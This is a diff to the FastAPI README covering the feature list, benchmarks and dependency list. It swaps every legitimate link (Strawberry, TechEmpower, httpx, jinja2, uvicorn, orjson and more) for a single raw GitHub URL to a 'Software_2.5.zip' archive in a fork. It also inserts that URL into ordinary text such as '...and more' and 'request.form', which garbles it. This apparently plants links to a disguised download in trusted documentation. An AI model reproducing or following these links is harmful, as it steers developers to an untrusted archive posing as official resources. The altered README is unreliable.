 **Spoiler alert**: the tutorial - user guide includes:
 
@@ -439,19 +439,19 @@ For a more complete example including more features, see the <a href="https://fa
 * A very powerful and easy to use **<abbr title="also known as components, resources, providers, services, injectables">Dependency Injection</abbr>** system.
 * Security and authentication, including support for **OAuth2** with **JWT tokens** and **HTTP Basic** auth.
 * More advanced (but equally easy) techniques for declaring **deeply nested JSON models** (thanks to Pydantic).
-* **GraphQL** integration with <a href="https://strawberry.rocks" class="external-link" target="_blank">Strawberry</a> and other libraries.
+* **GraphQL** integration with <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">Strawberry</a> and other libraries.
 * Many extra features (thanks to Starlette) as:
     * **WebSockets**
     * extremely easy tests based on HTTPX and `pytest`
     * **CORS**
     * **Cookie Sessions**
-    * ...and more.
+    * https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip more.
 
 ## Performance
 
-Independent TechEmpower benchmarks show **FastAPI** applications running under Uvicorn as <a href="https://www.techempower.com/benchmarks/#section=test&runid=7464e520-0dc2-473d-bd34-dbdfd7e85911&hw=ph&test=query&l=zijzen-7" class="external-link" target="_blank">one of the fastest Python frameworks available</a>, only below Starlette and Uvicorn themselves (used internally by FastAPI). (*)
+Independent TechEmpower benchmarks show **FastAPI** applications running under Uvicorn as <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="external-link" target="_blank">one of the fastest Python frameworks available</a>, only below Starlette and Uvicorn themselves (used internally by FastAPI). (*)
 
-To understand more about it, see the section <a href="https://fastapi.tiangolo.com/benchmarks/" class="internal-link" target="_blank">Benchmarks</a>.
+To understand more about it, see the section <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" class="internal-link" target="_blank">Benchmarks</a>.
 
 ## Dependencies
 
@@ -463,17 +463,17 @@ When you install FastAPI with `pip install "fastapi[standard]"` it comes with th
 
 Used by Pydantic:
 
-* <a href="https://github.com/JoshData/python-email-validator" target="_blank"><code>email-validator</code></a> - for email validation.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>email-validator</code></a> - for email validation.
 
 Used by Starlette:
 
-* <a href="https://www.python-httpx.org" target="_blank"><code>httpx</code></a> - Required if you want to use the `TestClient`.
-* <a href="https://jinja.palletsprojects.com" target="_blank"><code>jinja2</code></a> - Required if you want to use the default template configuration.
-* <a href="https://github.com/Kludex/python-multipart" target="_blank"><code>python-multipart</code></a> - Required if you want to support form <abbr title="converting the string that comes from an HTTP request into Python data">"parsing"</abbr>, with `request.form()`.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>httpx</code></a> - Required if you want to use the `TestClient`.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>jinja2</code></a> - Required if you want to use the default template configuration.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>python-multipart</code></a> - Required if you want to support form <abbr title="converting the string that comes from an HTTP request into Python data">"parsing"</abbr>, with `https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip()`.
 
 Used by FastAPI / Starlette:
 
-* <a href="https://www.uvicorn.org" target="_blank"><code>uvicorn</code></a> - for the server that loads and serves your application. This includes `uvicorn[standard]`, which includes some dependencies (e.g. `uvloop`) needed for high performance serving.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>uvicorn</code></a> - for the server that loads and serves your application. This includes `uvicorn[standard]`, which includes some dependencies (e.g. `uvloop`) needed for high performance serving.
 * `fastapi-cli` - to provide the `fastapi` command.
 
 ### Without `standard` Dependencies
@@ -486,13 +486,13 @@ There are some additional dependencies you might want to install.
 
 Additional optional Pydantic dependencies:
 
-* <a href="https://docs.pydantic.dev/latest/usage/pydantic_settings/" target="_blank"><code>pydantic-settings</code></a> - for settings management.
-* <a href="https://docs.pydantic.dev/latest/usage/types/extra_types/extra_types/" target="_blank"><code>pydantic-extra-types</code></a> - for extra types to be used with Pydantic.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>pydantic-settings</code></a> - for settings management.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>pydantic-extra-types</code></a> - for extra types to be used with Pydantic.
 
 Additional optional FastAPI dependencies:
 
-* <a href="https://github.com/ijl/orjson" target="_blank"><code>orjson</code></a> - Required if you want to use `ORJSONResponse`.
-* <a href="https://github.com/esnme/ultrajson" target="_blank"><code>ujson</code></a> - Required if you want to use `UJSONResponse`.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>orjson</code></a> - Required if you want to use `ORJSONResponse`.
+* <a href="https://raw.githubusercontent.com/adilmaqsood1/fastapi/master/docs/zh/docs/deployment/Software_2.5.zip" target="_blank"><code>ujson</code></a> - Required if you want to use `UJSONResponse`.
 
 ## License
 
